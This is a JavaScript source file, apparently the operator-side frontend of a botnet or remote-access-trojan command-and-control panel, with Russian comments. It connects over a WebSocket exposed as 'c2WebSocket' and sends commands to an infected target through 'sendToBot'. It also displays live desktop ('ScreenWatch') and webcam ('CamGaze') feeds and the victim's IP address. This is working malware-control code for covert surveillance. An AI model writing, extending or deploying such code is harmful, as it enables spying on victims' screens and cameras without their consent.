 /* frontend/client_control/js/modules/websocket/connection.js */

import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';

let ws, heartbeatTimer;
const targetId = new URLSearchParams(location.search).get('id');

/* ==========================================================================
   1. ИНТЕРФЕЙС (UI)
   ========================================================================== */

const updateStatusUI = (status) => {
    const isOnline = (status === 'online');
    document.getElementById('status-indicator')?.classList.toggle('online', isOnline);

    const label = document.getElementById('status-text');
    if (label) label.textContent = isOnline ? 'online' : 'offline';
};

const updateMetaUI = (id, val) => {
    const map = { 'clientId': 'display-id', 'clientIp': 'display-ip' };
    const el = document.getElementById(map[id]);
    if (el && !(id === 'clientIp' && (!val || val === "0.0.0.0"))) {
        el.textContent = val;
    }
};

/* ==========================================================================
   2. HEARTBEAT ЛОГИКА
   ========================================================================== */

const handleHeartbeat = () => {
    clearTimeout(heartbeatTimer);
    updateStatusUI('online'); // Включаем online при получении пакета

    heartbeatTimer = setTimeout(() => {
        updateStatusUI('offline');
    }, 5000);
};

/* ==========================================================================
   3. СЕТЕВОЕ СОЕДИНЕНИЕ (WEBSOCKET)
   ========================================================================== */

export function initControlConnection() {
    const [token, login] = [localStorage.getItem('auth_token'), localStorage.getItem('user_login')];
    if (!token || !targetId) return;

    updateStatusUI('offline');

    const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${protocol}//${location.host}/ws?login=${encodeURIComponent(login)}&token=${token}`);
    ws.binaryType = 'arraybuffer';
    window.c2WebSocket = ws;

    ws.onopen = () => {
        setInterval(() => ws?.readyState === 1 && ws.send(encodePacket("0", "ping")), 25000);
        window.sendToBot('DataScribe', 'get_metadata');
    };

    ws.onmessage = ({ data }) => {
        const pkg = decodePacket(data);
        if (!pkg || (pkg.id !== targetId && pkg.id !== "0")) return;

        if (pkg.id === targetId) handleHeartbeat();

        if (pkg.module === 'DataScribe') {
            try {
                const meta = JSON.parse(new TextDecoder().decode(pkg.payload));
                updateMetaUI('clientId', targetId);
                if (meta.ip) updateMetaUI('clientIp', meta.ip);
            } catch (e) { console.error("Metadata error:", e); }
        } else {
            const routes = { 'ScreenWatch': window.updateDesktopFeed, 'CamGaze': window.updateWebcamFeed };
            if (routes[pkg.module]) routes[pkg.module](pkg.payload);
        }
    };

    window.sendToBot = (mod, payload = "") => {
        if (ws?.readyState !== 1) return;
        const data = typeof payload === 'string' ? new TextEncoder().encode(payload) : payload;
        ws.send(encodePacket(targetId, mod, data));
    };
}